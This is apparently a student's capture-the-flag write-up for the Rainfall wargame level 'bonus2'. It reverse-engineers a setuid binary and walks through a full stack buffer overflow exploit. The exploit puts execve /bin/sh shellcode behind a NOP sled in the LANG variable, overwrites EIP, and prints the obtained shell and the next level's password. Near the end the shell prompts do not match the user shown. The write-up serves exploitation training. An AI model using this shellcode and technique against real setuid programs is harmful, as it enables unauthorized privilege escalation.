# Rainfall Bonus 2 Guide
This guide will walk you through the process of finding the password for the `bonus3` user.

## 1. Examine your environment
   
`id` : Shows user and group identities that you have.
```bash
uid=2012(bonus2) gid=2012(bonus2) groups=2012(bonus2),100(users)
```
`pwd` : Displays the current directory you are in.
```bash
/home/user/bonus2
```
`ls -la` : Lists files and their permissions in the current directory.
```bash
-rwsr-s---+ 1 bonus3 users  5664 Mar  6  2016 bonus2
```

We can see that the `bonus2` binary has the `setuid` bit set, which means that it runs with the permissions of the owner of the file. In this case, the owner is `bonus3`. It executable by the `users` group, our current group.

We execute the binary to see what it does.
```bash
bonus2@RainFall:~$ ./bonus2
bonus2@RainFall:~$ ./bonus2 a
bonus2@RainFall:~$ ./bonus2 a a
Hello a
bonus2@RainFall:~$ ./bonus2 test1 test2
Hello test1
```

We can see that the binary takes two arguments and prints the first one, with a `Hello` before it.

## 2. Reverse engineering

We continue by disassembling the binary to understand how it works.
```bash
bonus2@RainFall:~$ gdb ./bonus2
(gdb) disas main
```

Now, we convert the assembly code to C++ code using an online tool like [CodeConvert](https://www.codeconvert.ai/assembly-to-c++-converter).
You can find the reconstructed C++ code in [source.cpp](source.cpp).

We will also use Ghidra to reverse engineer the binary. You can find the analysis in [Ressources/ghidra_analyse_bonus2.c](Ressources/ghidra_analyse_bonus2.c).

In the `greetuser()` function, we can see:
```c
if (language == 1) {
    local_4c._0_1_ = 'H';
    local_4c._1_1_ = 'y';
    local_4c._2_1_ = 'v';
    local_4c._3_1_ = -0x3d;
    local_48._0_1_ = -0x5c;
    local_48._1_1_ = -0x3d;
    local_48._2_1_ = -0x5c;
    local_48._3_1_ = ' ';
    local_44._0_1_ = 'p';
    local_44._1_1_ = -0x3d;
    local_44._2_1_ = -0x5c;
    local_44._3_1_ = 'i';
    local_40 = 0xc3a4c376;
    local_3c = 0x20a4;
    local_3a = 0;
  }
```

`-0x3d` is a negative value. The negative value are used to represent no-ASCII characters. But the value should be positive to be read in a UTF-8 string. We can used a standard method to convert the value to a value that can be read in a UTF-8 string, add 256 to the negative value to get the positive value.
`-0x3d` -> `256 - 0x3d` -> `0xc3`
`-0x5c` -> `256 - 0x5c` -> `0xa4`

## 3. Analysis

In the `main` function, we can see:
```c
strncpy(buffer, argv[1], 0x28);
strncpy(buffer + 0x28, argv[2], 0x20);
```
`0x28` is 40 in decimal, and `0x20` is 32 in decimal.
The 40 first bytes of the buffer are filled with the first argument.
The 32 next bytes are filled with the second argument, from the 41st byte.
```c
const char* env_lang = getenv("LANG");

if (env_lang != 0) {
    if (memcmp(env_lang, "fi", 2) == 0) {
        env_var = 1;
    } else if (memcmp(env_lang, "nl", 2) == 0) {
        env_var = 2;
    }
}
```
The binary checks the `LANG` environment variable to determine the language to use, and set the `env_var`.

In the `greetuser` function, we can see:

```c
void greetuser(char *userInput) {

    char buffer[72];

    if (env_var == 1) {
        strcpy(buffer, "Hyv\xc3\xa4\xc3\xa4 p\xc3\xa4iv\xc3\xa4\xc3\xa4 ");
    } else if (env_var == 2) {
        strcpy(buffer, "Goedemiddag! ");
    } else if (env_var == 0) {
        strcpy(buffer, "Hello ");
    }

    strcat(buffer, userInput);

    puts(buffer);
}
```

The buffer is filled with a greeting message depending on the `env_var` value.
We can guess that `env_var` is set to 0 by default.

## 4. Exploitation

We will try to exploit the buffer overflow vulnerability in the binary to execute a shell.
We will try to overflow the local buffer in the `greetuser` function to overwrite the EIP register.

We know that the buffer in `main` function is 72 bytes long (see above).
In the `greetuser` function, we use `strcpy` to fill the local buffer with a message, and `strcat` to append the user input to the buffer. So if the user input is longer than 72 bytes, we can overflow the local buffer.

There is 3 different message to concatenate to the user input:

- `Hyv\xc3\xa4\xc3\xa4 p\xc3\xa4iv\xc3\xa4\xc3\xa4` -> `Hyvää päivää` -> 13 bytes
- `Goedemiddag!` -> 12 bytes
- `Hello` -> 5 bytes

We can use the `Hyvää päivää` message to fill the buffer, and then overflow it with the user input.

### 4.1. Find a adress to the shellcode

We want execute a shell (`\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80`).
With `gdb`, we set a breakpoint in the `main` just after the call to `LANG` environment variable.

We need to find the adress just after the call to `LANG` environment variable.
```bash
bonus2@RainFall:~$ gdb ./bonus2
(gdb) disass main
Dump of assembler code for function main:
    ...
   0x08048594 <+107>:	add    $0x28,%eax
   0x08048597 <+110>:	mov    %eax,(%esp)
   0x0804859a <+113>:	call   0x80483c0 <strncpy@plt>
   0x0804859f <+118>:	movl   $0x8048738,(%esp)
   0x080485a6 <+125>:	call   0x8048380 <getenv@plt>
   0x080485ab <+130>:	mov    %eax,0x9c(%esp)
   0x080485b2 <+137>:	cmpl   $0x0,0x9c(%esp)
    ...
```
The address just after the call to `LANG` environment variable (`getenv`) is `0x080485ab`.
So we set a breakpoint at this address.
```bash
(gdb) break *0x080485ab
```
And we run the program:
```bash
(gdb) run teeeeest ccccccccccc
```
We use `info proc mappings` to examine the memory mappings, and the environment variables.
```bash
(gdb) info proc mappings
```
And we use the `x/20s` command to examine the string in the memory.
```bash
(gdb) x/20s *((char **)environ)
0xbffff91e:	 "SHELL=/bin/bash"
0xbffff92e:	 "TERM=xterm-256color"
0xbffff942:	 "SSH_CLIENT=10.0.2.2 33778 4242"
0xbffff961:	 "SSH_TTY=/dev/pts/0"
0xbffff974:	 "USER=bonus2"
    ...
0xbffffea1:	 "COLUMNS=114"
0xbffffead:	 "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
0xbffffefa:	 "MAIL=/var/mail/bonus2"
0xbfffff10:	 "_=/usr/bin/gdb"
0xbfffff1f:	 "PWD=/home/user/bonus2"
0xbfffff35:	 "LANG=fi"
0xbfffff3d:	 "LINES=60"
0xbfffff46:	 "HOME=/home/user/bonus2"
```
We can see that the `LANG` environment variable is at the address `0xbfffff35`.

### 4.3. Find the offset to overwrite the EIP register

We will use a pattern generate by `Wiremask` to find the offset to overwrite the EIP register.
```bash
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

We run the program with 40 bytes or more in the first argument, and the pattern in the second argument.
```bash
(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```
We examine the memory to find the offset.
```bash
(gdb) info registers
...
eip            0x41366141	0x41366141
...
```

The offset is `18`. So, with `fi` in `LANG` environment variable, we can overwrite the EIP register with the address of the shellcode after 18 bytes in the second argument.

### 4.4. Build the final exploit

We inject the shellcode in the `LANG` environment variable with `NOP` sled to make sure the shellcode is executed.
```bash
export LANG=$(python -c 'print("fi" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
```
We set a breakpoint at the address `0x080485ab` (just after the call to `LANG` environment variable) and we run the program with this environment variable setted to find the address of the `LANG` environment variable.
```bash
(gdb) break *0x080485ab
(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBB
```
We examine the memory to find the address of the `LANG` environment variable.
```bash
(gdb) info proc mappings
(gdb) x/20s *((char **)environ)
...
0xbffffe34:	 "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
0xbffffe81:	 "MAIL=/var/mail/bonus2"
0xbffffe97:	 "_=/usr/bin/gdb"
0xbffffea6:	 "PWD=/home/user/bonus2"
0xbffffebc:	 "LANG=fi\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220j\vX\231Rh//shh/bin\211\343\061\311\315\200"
...
```

The address of the `LANG` environment variable is `0xbffffebc`.
So to jump in the `NOP` sled, we can use the address `0xbffffebc` + 40 (random) = `0xbffffee8`.
`0xbffffee8` in little-endian is `\xe8\xfe\xff\xbf`.

And we construct our arguments:
- first argument: 40 bytes to fill the buffer : `$(python -c 'print "A" * 40')`
- second argument: 18 bytes, then the address of the `LANG` environment variable : `$(python -c 'print "B" * 18 + "\xe8\xfe\xff\xbf"')`

We run the program with this arguments.
```bash
bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "\xe8\xfe\xff\xbf"')
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB����
$ 
```

We have a shell, we can read the password in the `bonus3` file.
```bash
$ whoami
bonus3
$ cat /home/user/bonus3/.pass            
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

Congratulations!
We can now connect to the `bonus3` user with this password.
```bash
bonus0@RainFall:~$ su bonus3
Password:
bonus1@RainFall:~$
```
